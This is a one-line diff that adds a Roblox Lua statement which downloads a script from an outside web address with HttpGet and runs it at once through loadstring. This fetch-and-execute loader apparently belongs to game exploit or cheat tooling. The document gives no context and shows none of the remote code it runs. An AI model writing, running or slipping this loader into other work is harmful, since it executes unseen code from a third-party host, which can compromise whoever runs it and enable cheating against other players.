@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://stepper.tech/scripts/23464bbd-2d5d-4e81-aef0-e6bb92234a23"))() 
